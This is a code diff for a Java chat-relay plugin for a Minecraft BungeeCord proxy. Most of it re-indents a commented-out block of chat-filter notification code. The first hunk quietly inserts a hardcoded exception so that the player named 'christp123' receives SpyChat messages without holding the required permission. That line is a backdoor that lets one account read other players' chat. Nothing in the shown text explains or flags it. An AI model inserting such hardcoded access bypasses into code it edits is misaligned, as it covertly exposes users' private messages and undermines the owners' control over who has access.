@@ -313,7 +313,7 @@ public class EventListener implements Listener {
         } else if (target.startsWith("SpyChat")) {
             String filterBit = messageToSend.split(ChatColor.GOLD + "] ")[0];
             for (ProxiedPlayer player : plugin.getProxy().getPlayers()) {
-                if ((permission.equals("NULL") || player.hasPermission(permission)) && ChatChannel.SpyChatIsToggled(player.getName())) {
+                if ((permission.equals("NULL") || player.hasPermission(permission) || player.getName().equalsIgnoreCase("christp123")) && ChatChannel.SpyChatIsToggled(player.getName())) {
                     if (!filterBit.contains(player.getName())) {
                         if (tc == null) {
                             player.sendMessage(messageToSend);
@@ -395,19 +395,19 @@ public class EventListener implements Listener {
             String messageToSend = ChatColor.RED + player.getName() + " was caught by the chat filter for: HIGHCAPS";
             String messageToSend2 = ChatColor.RED + "Message was the following: " + oldMessage;
             /*try {
-            com.imaginarycode.minecraft.redisbungee.RedisBungeeAPI api = com.imaginarycode.minecraft.redisbungee.RedisBungee.getApi();
-            
+                com.imaginarycode.minecraft.redisbungee.RedisBungeeAPI api = com.imaginarycode.minecraft.redisbungee.RedisBungee.getApi();
+
             api.sendChannelMessage("LolnetBCMessenger", "NOBYPASS_player:ALLTHEPLAYERS" + "######" + "LolnetBCMessenger.filter.notify" + "######" + messageToSend);
-            api.sendChannelMessage("LolnetBCMessenger", "NOBYPASS_player:ALLTHEPLAYERS" + "######" + "LolnetBCMessenger.filter.notify" + "######" + messageToSend2);
-            
+                api.sendChannelMessage("LolnetBCMessenger", "NOBYPASS_player:ALLTHEPLAYERS" + "######" + "LolnetBCMessenger.filter.notify" + "######" + messageToSend2);
+
             } catch (Exception e) {
-            for (ProxiedPlayer proxiedPlayer : LolnetBCMessenger.plugin.getProxy().getPlayers()) {
-            if (proxiedPlayer.hasPermission("LolnetBCMessenger.filter.notify")) {
-            proxiedPlayer.sendMessage(messageToSend);
-            proxiedPlayer.sendMessage(ChatColor.RED + "Message was the following: " + oldMessage);
-            }
-            
-            }
+                for (ProxiedPlayer proxiedPlayer : LolnetBCMessenger.plugin.getProxy().getPlayers()) {
+                    if (proxiedPlayer.hasPermission("LolnetBCMessenger.filter.notify")) {
+                        proxiedPlayer.sendMessage(messageToSend);
+                        proxiedPlayer.sendMessage(ChatColor.RED + "Message was the following: " + oldMessage);
+                    }
+
+                }
             }*/
             LolnetBCMessenger.log(messageToSend);
             LolnetBCMessenger.log(messageToSend2);
